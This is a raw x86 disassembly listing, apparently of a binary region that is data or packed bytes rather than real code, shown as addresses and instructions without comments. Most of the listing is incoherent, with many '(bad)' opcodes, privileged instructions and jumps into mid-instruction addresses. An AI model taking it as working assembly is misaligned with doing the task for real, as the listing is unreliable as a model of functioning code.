  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
